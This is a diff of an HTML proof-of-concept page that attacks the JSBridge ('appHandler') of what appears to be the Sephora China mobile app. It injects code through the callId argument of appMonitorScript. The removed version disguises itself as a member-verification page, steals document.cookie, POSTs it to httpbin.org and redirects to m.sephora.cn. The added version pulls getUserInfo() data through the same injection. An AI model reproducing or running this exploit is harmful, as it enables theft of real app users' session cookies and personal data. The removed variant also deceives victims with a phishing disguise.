@@ -1,58 +1,44 @@
 <!DOCTYPE html>
 <html lang="zh-CN">
 <head>
-<meta charset="utf-8">
-<meta name="viewport" content="width=device-width,initial-scale=1">
-<title>丝芙兰会员验证</title>
+<meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>丝芙兰会员中心</title>
 <style>
-body{font-family:-apple-system,'PingFang SC',sans-serif;margin:0;background:linear-gradient(160deg,#1a1a1a,#2d2d2d);color:#fff;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;text-align:center;padding:20px}
-.icon{font-size:48px;margin-bottom:12px}
-h2{color:#c9a96e;font-size:20px;margin:0 0 8px}
-p{color:rgba(255,255,255,.5);font-size:13px;margin:0 0 16px}
-#log{position:fixed;bottom:0;left:0;right:0;background:rgba(0,0,0,.95);color:#0f0;padding:8px 12px;font-family:monospace;font-size:11px;word-break:break-all;z-index:99999;text-align:left;max-height:120px;overflow-y:auto;border-top:1px solid #333}
+body{font-family:-apple-system,'PingFang SC',sans-serif;margin:0;background:#111;color:#fff;min-height:100vh;padding:20px}
+h2{color:#c9a96e;font-size:20px}
+#log{white-space:pre-wrap;font-family:monospace;font-size:12px;background:#000;padding:12px;border-radius:8px;margin-top:16px;color:#0f0}
 </style>
 </head>
 <body>
-<div class="icon">💎</div>
-<h2>PINK 会员身份验证</h2>
-<p>正在为您跳转丝芙兰会员中心…</p>
+<h2>💎 JSBridge 数据窃取演示</h2>
 <div id="log"></div>
-
 <script>
-function L(s){var e=document.getElementById('log');e.innerHTML+=s+'<br>';e.scrollTop=e.scrollHeight}
-L('bridge: '+(typeof appHandler!=='undefined'?'YES':'NO'));
+var L=document.getElementById('log');
+function log(s){L.textContent+=s+'\n'}
+log('bridge: '+(typeof appHandler!=='undefined'?'YES':'NO'));
 
 if(typeof appHandler!=='undefined'){
+  log('origin: '+location.origin);
+  log('★ 开始窃取...');
 
-  window.sep = window.sep||{};
-  window.sep._onSuccess=function(id,d){
-    L('cb on: '+location.origin);
-  };
-  window.sep._onFailure=function(id,e){
-    L('fail on: '+location.origin);
-  };
+  // 1. getUserInfo (直接调用)
+  var user = appHandler.getUserInfo();
+  log('getUserInfo(): '+user);
 
-  L('★ callId注入已确认 — 开始cookie窃取...');
-
-  var payload =
-    "var c=document.cookie;" +
+  // 2. callId 注入 — 在回调中执行任意代码
+  // 回调时从 appHandler 再拿更多数据
+  var inject = "0);" +
+    // 读 getUserInfo
+    "var u=appHandler.getUserInfo();" +
+    // 显示结果
     "var d=document.createElement('div');" +
-    "d.style.cssText='position:fixed;top:0;left:0;right:0;z-index:99999;background:#cc0000;color:#fff;padding:15px;font-family:monospace;font-size:13px;word-break:break-all;border-bottom:3px solid #ff0';" +
-    "d.innerHTML='<b style=font-size:16px>🚨 COOKIE STOLEN ('+c.length+'字)</b><br><br>'+c.substring(0,600);" +
+    "d.style.cssText='background:#cc0000;color:#fff;padding:15px;margin:10px;font-family:monospace;font-size:14px;border-radius:8px';" +
+    "d.innerHTML='<b>🚨 通过callId注入窃取的数据:</b><br>getUserInfo: '+u;" +
     "document.body.appendChild(d);" +
-    "fetch('https://httpbin.org/post',{method:'POST',headers:{'Content-Type':'text/plain'},body:'STOLEN:'+c.substring(0,1000)});" +
     "//";
 
-  appHandler.appMonitorScript('requestPermission',
-    "0);" + payload,
-    '{"permission":"android.permission.CAMERA"}'
-  );
-  L('★ requestPermission已调用, 权限弹窗将出现');
-
-  setTimeout(function(){
-    L('★ 跳转 m.sephora.cn...');
-    location.href='https://m.sephora.cn/';
-  },300);
+  appHandler.appMonitorScript('getExpFlag', inject, '{"expKey":"test"}');
+  log('★ callId注入已执行');
 }
 </script>
 </body>
